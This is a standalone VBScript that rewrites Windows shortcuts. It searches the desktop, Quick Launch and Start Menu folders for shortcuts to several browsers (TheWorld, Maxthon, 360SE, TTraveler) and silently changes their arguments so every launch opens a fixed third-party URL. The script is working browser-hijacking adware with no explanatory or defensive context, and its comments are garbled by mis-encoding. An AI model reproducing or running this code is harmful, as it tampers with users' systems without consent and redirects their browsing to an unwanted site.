Set WshShell = WScript.CreateObject("WScript.Shell")
strDesktop = WshShell.SpecialFolders("Desktop") :'�����ļ��С����桱
Favorites = WshShell.SpecialFolders("Favorites") :'�����ļ��С����桱
Sub Doit(lnktz)
Dim oldpath,newpath
oldpath = lnktz 
Dim Wsh,fso
newpath = "http://www.cc668.com/?11" 
Set Wsh = WScript.CreateObject("WScript.Shell")
Set fso = CreateObject("Scripting.FileSystemObject")
Dim oShlnk,Folder
Folder = Wsh.SpecialFolders("Desktop")
Dim f,fc,f1,ext
Set f = fso.GetFolder(Folder)
Set fc = f.Files
For Each f1 in fc
ext = LCase(fso.GetExtensionName(f1))
if ext = "lnk" then
Set oShlnk = Wsh.CreateShortcut(f1)
If Instr(oShLnk.TargetPath,oldpath) > 0 Then
oShLnk.Arguments = newpath
oShLnk.Save 
End If
Set oShLnk=NoThing
end if
Next
Dim Folders
Folders = Wsh.SpecialFolders("AllUsersDesktop")
Set f = fso.GetFolder(Folders)
Set fc = f.Files
For Each f1 in fc
ext = LCase(fso.GetExtensionName(f1))
if ext = "lnk" then
Set oShlnk = Wsh.CreateShortcut(f1)
If Instr(oShLnk.TargetPath,oldpath) > 0 Then
oShLnk.Arguments = newpath
oShLnk.Save 
End If
Set oShLnk=NoThing
end if
Next
Folders = Wsh.SpecialFolders.Item("AppData")& "\Microsoft\Internet Explorer\Quick Launch"
Set f = fso.GetFolder(Folders)
Set fc = f.Files
For Each f1 in fc
ext = LCase(fso.GetExtensionName(f1))
if ext = "lnk" then
Set oShlnk = Wsh.CreateShortcut(f1)
If Instr(oShLnk.TargetPath,oldpath) > 0 Then
oShLnk.Arguments = newpath
oShLnk.Save 
End If
Set oShLnk=NoThing
end if
Next
Folders = Wsh.SpecialFolders.Item("StartMenu")
Set f = fso.GetFolder(Folders)
Set fc = f.Files
For Each f1 in fc
ext = LCase(fso.GetExtensionName(f1))
if ext = "lnk" then
Set oShlnk = Wsh.CreateShortcut(f1)
If Instr(oShLnk.TargetPath,oldpath) > 0 Then
oShLnk.Arguments = newpath
oShLnk.Save 
End If
Set oShLnk=NoThing
end if
Next
Folders = Wsh.SpecialFolders.Item("AllUsersStartMenu")
Set f = fso.GetFolder(Folders)
Set fc = f.Files
For Each f1 in fc
ext = LCase(fso.GetExtensionName(f1))
if ext = "lnk" then
Set oShlnk = Wsh.CreateShortcut(f1)
If Instr(oShLnk.TargetPath,oldpath) > 0 Then
oShLnk.Arguments = newpath
oShLnk.Save 
End If
Set oShLnk=NoThing
end if
Next
Set WSH = Nothing
End Sub
Call Doit("TTraveler.exe")
Call Doit("TheWorld.exe")
Call Doit("Maxthon.exe")
Call Doit("360SE.exe")
WScript.quit
